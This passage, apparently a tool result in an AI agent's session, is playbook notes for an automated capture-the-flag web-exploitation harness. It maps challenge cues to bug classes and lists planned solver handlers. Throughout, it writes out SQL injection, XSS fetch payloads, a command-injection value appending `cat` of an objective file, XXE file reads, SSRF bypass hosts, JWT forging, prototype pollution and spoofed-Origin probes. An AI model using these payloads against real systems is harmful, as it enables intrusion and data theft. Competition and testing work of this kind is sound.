{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01EB1vNWXwRTtgrYZqmkGbqD","type":"tool_result","content":"75\t  GET /api/clues   -> feature_route / secondary_route / current_role|current_user + ZERO or ONE concept key\n76\t  GET each clue route BARE: the JSON error names the missing piece (post_required(405) = POST sink,\n77\t      administrator_required, path_required, account_id_required, loopback_only, 426 websocket_upgrade_required;\n78\t      404 not_found on a GraphQL route = POST JSON). A *_guide_route / inventory_route JSON lists the next requests.\n79\t  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n80\t  regex  proof_[0-9a-f]{32}  over EVERY body/frame. An `effect` without the proof is NOT a solve (D12, D16).\n81\t  Any file read (LFI, cmd, SSTI, XXE, file://): /run/huntress/config.json `weakness` names the class.\n82\tPick routes by clue KEY, NEVER by the word in the value (process|execute|inspect|submit|result|audit re-dealt).\n83\tNo concept key (D11-D13, D15, D21) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form).\n84\tQuery values: always --data-urlencode / %3B (Go drops a raw `;`). MASTERY: 5 targets, prompt = today's only ->\n85\t  earlier-day handlers use their own defaults (D04 reads /run/huntress/objective.txt with no path in the prompt).\n86\tONE-SHOT STATE (credits/balance/remaining in a secondary, \"race\", \"twice\") -> GET only until the burst (D21).\n87\t\n88\tCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\n89\trobots Disallow, \"backup\" | \"Signed in as\" + ids       -> backup | IDOR      -> Disallow -> index -> .bak (depth 2) | foreign id from /api/history\n90\tsearch box, \"database\" | feature_route only, \"a sign\"  -> SQLi | open route  -> q=zz') OR 1=1 -- (+ quote-balanced ' \" )) #) | GET it\n91\t?doc= (handbook.php/notes.php), \"stay inside\"          -> traversal          -> ../ x10 + /run/huntress/objective.txt\n92\tcallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n93\t      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\n94\tmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n95\t  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\n96\tsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\n97\tpreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option, Sec-Fetch-Site: cross-site, Mode: navigate,\n98\t                                                                                Dest: document, foreign Referer; GET /api/preferences\n99\tupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\"} -> GET path\n100\t\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n101\t\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n102\t\"binds whatever you hand it\", administrator_required   -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin, roles,..}\n103\tinventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\n104\tabsolute_url_required + secondary internal_only        -> SSRF (D15)         -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\n105\tinput_parameter + example_path, 400 path_required      -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\n106\trecovery_guide_route, self_service_only                -> reset token (D17)  -> token for the self_service id, redeem it with the other account_id\n107\tprotected_reference + note, GET 404 not_found          -> GraphQL (D18)      -> POST {\"query\":\"{__schema{..}}\"}; case(id:\"<prot>\"){id title note}\n108\tevent_type + owner_scope (values), webhook_rejected    -> forged webhook(D19)-> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n109\t                                                                                role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\n110\tstate_format_route, \"sign nothing\", state_required     -> unsigned state(D20)-> GET guide; POST {<field>: b64url(sample, role=\"administrator\")} to `transport`\n111\t\"One credit, two purchases ... race it\", secondary 403 -> race (D21)         -> NO sequential POST; 24 concurrent POST {} to feature on a barrier,\n112\t  credit_not_overspent + credits, 409 credit_unavailable                        then GET secondary (UNSOLVED: success shape unknown)\n113\tstream_reference, 426 websocket_upgrade_required,      -> WS stream (D22)    -> WS handshake to feature?stream=<ref> WITH Origin: <target> (none = 403);\n114\t  \"upgraded to websockets ... never meant for you\"                              proof in the first server text frame (stdlib socket+ssl client)\n115\tdeployment: trusted_reverse_proxy, 403 loopback_only   -> proxy header (D23) -> GET feature with X-Forwarded-For: 127.0.0.1 (then X-Real-IP, Forwarded:\n116\t  + evaluated_client, \"whatever the proxy whispers\"                             for=, X-Client-IP, True-Client-IP); evaluated_client must flip\n117\tcurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to administrator/admin (cookie, header, claim)\n118\teyJ..eyJ..sig in cookie/Authorization, blob + .sig     -> JWT / signed state -> alg none / leaked secret / re-sign; then the role ladder\n119\totp/verify/step 2, \"second factor\" | ?next=/redirect_uri -> MFA skip | redirect -> final step with the step-1 session | point it at the clue route\n120\tlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n121\tHost/X-Forwarded-Host in links, \"cache\" | 403 on route -> Host poison | path -> X-Forwarded-Host/X-Original-URL; /ROUTE, //route, /route;/, method override\n122\tSSRF filtered (blocked_host) -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/...; ACAO echoes Origin -> CORS\n123\t/api/v1 vs /v2, \"legacy\"; EventSource/socket.io        -> shadow API / SSE   -> the protected op on every version / transport (same authz?)\n124\tXML/SVG/DOCX upload -> XXE <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">. \"__proto__\"/JSON merge -> {\"__proto__\":{\"isAdmin\":true}}\n125\tGeneric rejection naming no field (webhook_rejected) -> ONE alias-union JSON body first (D19). Real bot only on \"reviewer visits\" (D07).\n126\tNEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11, D19, D20, D23 -> TT\n127\tfirst try; D09-D10, D12-D13, D15-D18, D22 TT solver_incomplete). Banners are costume; the title pun names the bug.\n128\t```\n129\t\n130\t## Readiness gaps\n131\t\n132\tPriority 1 = plausible within ~3 calendar days (D24-D29 at ~2 lane-days per day). \"prebuild\" = pure python handler\n133\t(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\n134\tdecoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (web prebuild lane exists but is opt-in; no\n135\t`web:*` keys in .run/prebuild-state.json). Dropped after D23 (cal. 27): `websocket-authz` (seen D22 -> `sse-socketio-transport`), `header-trust-verb-path-bypass`\n136\t(header half seen D23 -> `path-verb-normalization-bypass`), `logic-race-reset` (race seen D21, unsolved ->\n137\t`race-burst-first-dispatch` note + `business-logic-tamper`). Added: `mastery-prompt-free-defaults`. Raised to 1:\n138\t`cache-host-header`, `cors-misconfig-probe`, `codify-before-tt` (regressed on D22). Lowered to 2: webhook / SSRF /\n139\tdeserialization sequels (new concepts beat sequels since D19). Dropped after D13: `ssti-engine-probe`, `port-day22-handlers`. After D15:\n140\t`ssrf-planner`. After D18: `cmd-injection-planner`, `graphql-introspection`. After D20: `api-unsafe-consumption`\n141\t(seen D19 -> `webhook-signature-sequels`); `deserialization-gadgets` narrowed to native/signed formats (unsigned JSON\n142\tstate seen D20); `codify-before-tt` lowered to 2 (fixed on D19-D20). Added after D20: `webhook-signature-sequels`,\n143\t`alias-union-body-builder`, `crypto-weak-token-derivation`, `known-vulnerable-component`, `log-injection-forging`;\n144\traised: `jwt-session-forge` (first), `role-tamper-planner` detail (role ladder).\n145\t\n146\t```json\n147\t[\n148\t  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: the web prebuild lane exists but is opt-in (HCTF_PREBUILD_WEB=1)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Partly done on D25: hctf/prebuild.py LANES now has `web` (brief prebuild_web, writable lib/web/handlers/prebuilt/ + tests/data/web_fixtures/, targets tests/data/web_fixtures/TARGETS.json, offline gate tests/test_web_fixtures.py, requires lib/web/handlers/__init__.py:_load_plugins + lib/web/handlers/prebuilt/__init__.py) but it is OPT-IN: AUTO_LANES only appends web when HCTF_PREBUILD_WEB=1 (or HCTF_PREBUILD_LANES lists it). After D20 lib/web/handlers/prebuilt/ still holds only __init__.py and .run/prebuild-state.json has no web:* keys -> nothing below has drained. Owner of the nightly batch: set HCTF_PREBUILD_WEB=1 (or add web to the default AUTO_LANES) so the prebuild gaps below get built; fixtures = saved target responses (targets 410 after CORRECT).\"},\n149\t  {\"id\": \"race-burst-first-dispatch\", \"concept\": \"one-shot race targets must get the concurrent burst before ANY sequential POST (row 26)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D21 Double Spent single was never solved: at the workers' first GET the secondary already said credit_not_overspent credits:0 and every POST -> 409 credit_unavailable (sequential, 8x curl, 10x HTTP/2, 24x barrier). The race_bisect / prior-solver dry run ran 16 s on the fresh target (13:00:43-13:00:59) and its default ladder + D12/D13/D19 handlers POST to feature_route, which spends the one credit. Owner of lib/web + hctf: (1) promote challenges/day27/web-double-spent/solver/day27_web_double_spent.plugin_draft.py (GET gate on the secondary, barrier-synced ~24 POST {} burst, GET secondary) as lib/web/handlers/day27_web_double_spent.py; (2) in lib/web candidates(), when any GET body says credit_not_overspent / credits / balance / remaining, run ONLY the race handler first; (3) race_bisect / dry runs must be GET-only on web targets (or skip web). Matters for every future Mastery that deals a D21 target. Record the success effect spelling when it lands.\"},\n150\t  {\"id\": \"mastery-prompt-free-defaults\", \"concept\": \"earlier-day web solvers must not derive parameters from the Mastery prompt\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Cal. 27: both Mastery runs (D22, D23) went 4/5 -- proof-4 was a D04 Stay in Your Directory target (PHP+Apache, no /api/clues, `handbook.php?doc=triage.php` | `notes.php?doc=..`, proof in <article>). challenges/day20/web-stay-in-your-directory/solver/solve.py lfi() takes its read path from the prompt text (regex for /run|/etc|..) and otherwise uses /flag.txt; the Mastery prompt is today's, so it never tried /run/huntress/objective.txt. Fix: always include /run/huntress/objective.txt (and /run/huntress/config.json for classification) in the path list. Audit the other earlier-day solvers for the same prompt dependence.\"},\n151\t  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"REGRESSED on cal. 27: D22 Socket to Me's handler landed 21:02:33, 20 s after the TT solve began (21:01:59-21:02:13) -> TT solver_incomplete (live worker CORRECT ~40 s after ready). D23's handler landed before TT -> 10.5 s first try. FIXED on D19-D20 (cal. 26): the answer-first worker promoted the plugin during the single (45 s grace at CORRECT, commit 4715290f) -> both Time Trials (10.2 s, 15.1 s) and both Mastery runs (4/4, 13-16 s) first try, the first new-class TTs to pass since D14. Before that TT went solver_incomplete on D09, D10, D12, D13, D15-D18 (plugins landed 0-2 s after TT start; D16 Mastery 3/4 with the plugin still `.tmp`). Keep: if a single needs >~90 s, gate TT start on the promoted plugin being importable.\"},\n152\t  {\"id\": \"runtime-config-oracle\", \"concept\": \"/run/huntress/config.json names the weakness once any file read works\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D16's `cat /run/huntress/*` printed config.json {schema: huntress.web_exploitation.runtime_config.v1, profile_id: framework_<lang>_<fw>_<weakness>, framework_cell, weakness: os_command_injection, mode: single|time_trial|mastery, layout...} next to objective.txt. Owner of lib/web: after any handler achieves a file read (LFI D04, cmd D16, SSTI file read, XXE, SSRF file://), also read /run/huntress/config.json and log `weakness`/`profile_id` -- a free classifier for unknown Mastery targets and for the codify worker's KEY_MAP. Never submit anything from it; the proof is still objective.txt.\"},\n153\t  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Still unseen after D23 -- the biggest remaining session/integrity class. D20 'Serialized Offender' was the UNSIGNED form (`{state: b64url(JSON)}`, 'sign nothing'); the signed-but-weak sequel is the most likely next session/integrity day. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig, dropped sig segment), HS256 re-signed with secrets FOUND in recon (clues, *_guide/format routes, backups, .env, JS, comments, `kid` pointing at a readable file), RS256->HS256 with a published public key (jwks.json / *.pem route), jku/x5u to an app-owned route. Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1); Express `s:<val>.<sig>` (HMAC-SHA256 base64 no padding); generic `<b64 JSON>.<hex hmac>` blobs. Escalate with the D20 role ladder (administrator, admin, superuser, root, owner) on every `*role*`/`is_admin` claim, keep other claims. Reuse D20's format-guide reading (transport, request_field, encoding). No secret brute force beyond what the app leaks.\"},\n154\t  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D23 (proxy-trust day): the same 'trusted proxy' kit with another header family is the natural sequel -- X-Forwarded-Host / X-Host / X-Forwarded-Proto / X-Original-URL / X-Rewrite-URL one at a time against the feature route, and Host-poisoned reset/callback links. Reuse D23's error shape: a JSON error that echoes what the app evaluated (`evaluated_client`) tells which header bound. Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n155\t  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D22: the WS handshake was gated only on an Origin header being PRESENT (own or foreign accepted) -- the origin-trust family is live in this kit. Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n156\t  {\"id\": \"path-verb-normalization-bypass\", \"concept\": \"HTTP verb / method override and path-normalisation authz bypass (rows 16, 17)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D23 took the header half of the old 'header-trust-verb-path-bypass' gap (seen). The other two classic 403-bypass families remain and fit a 'protected path' kit (D23's prompt: 'stroll down the protected path'). Pure planner for a route that 401/403/405s: methods HEAD/POST/PUT/PATCH/OPTIONS/TRACE + X-HTTP-Method-Override / X-Method-Override / _method=; path variants /ROUTE upper-case, trailing /, /., //route, /./route, /route;/, /route..;/, %2e/%2f/%61 single-char encodings, trailing ?/#, X-Original-URL / X-Rewrite-URL with a harmless base path. Parser: proof regex; diff status/body against the baseline 403 and stop at the first 200 with evidence.\"},\n157\t  {\"id\": \"business-logic-tamper\", \"concept\": \"business-logic sequels: negative/huge amounts, price in the body, coupon replay, step reorder (row 26b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D21 showed a ledger kit (feature POST spends credits, secondary audits the balance). Sibling flaws a sequel day would use: quantity/amount -1, 0, 1e9, 0.0001, strings ('1e3'), a client-sent price/total field, a redeem/coupon token replayed or applied twice sequentially, a checkout/approval step called out of order. Planner input = guide/clue JSON + one observed request body; output = <= 12 single-change JSON bodies, GET secondary after each. GET-only recon first (one-shot state, see race-burst-first-dispatch). Parser: proof regex.\"},\n158\t  {\"id\": \"mfa-step-skip-auth-flow\", \"concept\": \"auth-flow sequels: MFA/OTP step skip, Host-header reset link, leaked/reused codes, login state machine (row 27b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D17 (reset token not bound to account) was the first authentication-flow day (OWASP API2). Planner over a guide/clue JSON or form chain: identify steps (login -> otp/verify -> session; request -> email/preview -> redeem); try calling the final step with the step-1 state (cookie/token) and no code, an empty/null/array code, the code issued to OUR account on another account_id/username, a code echoed in any response, a step-2 response flag (`mfa_required:false`, `verified:true`) set in the JSON body; reset links built from X-Forwarded-Host / Host to a route we can read. Parameter names from the guide (`account_parameter`, `token_parameter`, `code`, `otp`). Parser: proof regex / evidence. No brute force of codes.\"},\n159\t  {\"id\": \"alias-union-body-builder\", \"concept\": \"one JSON body carrying every clue value under every plausible alias + privilege/trust flags\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D19 lost ~60 s across three workers bisecting ~30 narrow bodies against a sink whose only error was webhook_rejected; the answer-first worker's kitchen-sink body landed first try in single/TT/Mastery. Pure builder: input = clue JSON (minus route keys) + optional guide sample; output = ordered list of JSON bodies: (1) union body: each value under its key and aliases (event_type/type/event/kind/action/topic/name; owner_scope/scope/owner/tenant; user/username/account/account_id; id/case_id/reference) + role/current_role/user_role 'admin' and 'administrator' variants + source/sender/provider/origin 'provider' + verified/signed/trusted/authenticated true; (2) nested variants {event:{..}}, {data:{..}}, {payload:{..}}; (3) per-field bisect list only after a hit. Never arrays at top level (D19 500). Reusable for any POST sink with a generic error (D12/D13/D19 shapes).\"},\n160\t  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n161\t  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n162\t  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n163\t  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON shows current_role: analyst. D13 granted admin via JSON body binding, D20 via a role field inside an unsigned state blob -- and D20 accepted ONLY `administrator` (`admin`, `ADMIN`, `staff`, flags -> role_not_permitted). Remaining forms: cookie role=<value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role= / ?admin=1, PATCH/PUT of the profile route. Value ladder, one request each: administrator, admin, superuser, root, owner, staff, manager, plus any higher value the app lists; `role_not_permitted` = right field, keep laddering. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n164\t  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence. Raised to 1 after D15: the API run (D13 mass assignment -> D14 property authz) keeps the JSON-object-binding family hot and Node costumes recur.\"},\n165\t  {\"id\": \"api-shadow-version\", \"concept\": \"improper API inventory: shadow / deprecated / beta endpoint skips the check (row 39, OWASP API9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D13-D15 walked the OWASP API Top 10 (API3, API5, API7) and D14's prompt said 'take inventory of every endpoint'. Planner: from /api/inventory, /openapi.json, /swagger.json, /api-docs, /v2/api-docs, /api/clues and JS literals, collect every path; emit version swaps (/api/v2/x -> /api/v1/x, /api/x -> /api/v0|beta|internal|legacy|old/x), `X-API-Version: 1`, `?version=1`, `Accept: application/vnd.<app>.v1+json`; call the protected operation (protected_reference / admin route) on each. Parser: proof regex; 403 on the current version + 200 on the shadow = the bug.\"},\n166\t  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n167\t  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py. D14: inventory_route + protected_reference -> fetch inventory JSON {route, query_parameters, fields, actions, public_reference} and enumerate field x action on the protected id (error id_fields_action_required / field_action_forbidden) -- plugin day24_web_the_api_has_opinions.py. D15 (no concept key): feature 400 absolute_url_required + secondary 403 internal_only -> SSRF (feature?url=http://127.0.0.1:8080<secondary>) -- plugin day24_web_fetch_quest.py; error fetch_failed = wrong host/port, keep laddering. D16: input_parameter + example_path (400 path_required) -> cmd injection, value = example + %3B + `cat /run/huntress/objective.txt` (plugin day25_web_shell_company.py). D17: recovery_guide_route -> guide JSON {request_route, redeem_route, account_parameter, token_parameter, accounts[{id,self_service}]} -> own token redeemed with the victim id (day25_web_reset_expectations.py). D18: protected_reference + note + current_user (no framework key), feature GET 404 not_found -> GraphQL introspection + case(id) (day25_web_resolver_revolt.py). KEY collision: protected_reference is D14 (with inventory_route) AND D18 (with note) -> route on the companion key; and any `*_guide_route`/`inventory_route` value is a JSON map of the next requests. D19: event_type + owner_scope are BODY VALUES (not routes), feature 405 post_required, POST -> webhook_rejected -> alias-union JSON body (day26_web_trust_the_webhook.py, KEY ^owner_scope$). D20: state_format_route (fixed /api/state-format) -> guide {transport: 'POST <route>', request_field, encoding, sample_state, sample_encoded}; feature 400 state_required -> encoded state with role ladder (day26_web_serialized_offender.py). Generalise: any key whose value is not a '/...' path is a body value to echo; any *_format_route/*_guide_route is a JSON map of the next request.\"},\n168\t  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web/ (package; see lib/web/__init__.py): concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one. D15 Mastery had 4 targets (first time); all known handlers answered them in 3.2 s, so the registry works when every class has a plugin -- keep per-host concurrency capped.\"},\n169\t  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n170\t  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n171\t  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n172\t  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n173\t  {\"id\": \"webhook-signature-sequels\", \"concept\": \"webhook sequels: HMAC-signed events with a leaked/weak secret, replay, provider allowlist (row 44b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27: D21-D23 were all new concepts, not D19/D20 sequels. D19 'Trust the Webhook' was the unsigned form (clues event_type + owner_scope as body values; narrow bodies -> webhook_rejected; an alias-union JSON with role/source/trust flags -> forged_event_consumed). Signed sequel planner: read signature header names from errors/guides (X-Hub-Signature-256 'sha256=<hex>', X-Signature, X-Webhook-Signature, Stripe-Signature 't=..,v1=..', Svix 'v1,<b64>'), compute HMAC-SHA256/SHA1 over the RAW body (or `t.` + body for Stripe-style) with any secret the app leaks (guide, sample event, .env, JS, logs); replay a logged/sample signed event with a fresh timestamp or unchanged signature when only the payload's unsigned envelope changes; provider headers (X-GitHub-Event, User-Agent GitHub-Hookshot/Stripe) and source IP headers. Body = alias-union of clue values. Parser: proof regex / evidence.\"},\n174\t  {\"id\": \"ssrf-filter-bypass\", \"concept\": \"SSRF sequels: filtered host/scheme, redirect, file://, blind (row 12b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27 (new concepts outrank sequels since D19). D15 was the plain form (feature?url=http://127.0.0.1:8080<internal_only route>; port 80 -> fetch_failed). Sequels in the D10->D11 / D03->D12 style: blocklist on 127.0.0.1/localhost -> 2130706433, 0x7f000001, 017700000001, 127.1, 127.0.0.1.nip.io-style only if the app names it, [::1], [::ffff:127.0.0.1], 0.0.0.0; allowlist 'must start with/contain <host>' -> https://<allowed>@127.0.0.1:8080/, http://127.0.0.1:8080#@<allowed>, ?u=<allowed>; scheme filter -> file:///run/huntress/objective.txt, FILE://, gopher only if named; redirect hop via an app-owned open redirect (row 24b) or a clue route that 302s; POST/JSON body {url} when GET 405s; port ladder 8080, 80, 5000, 8000, 3000, 8888, 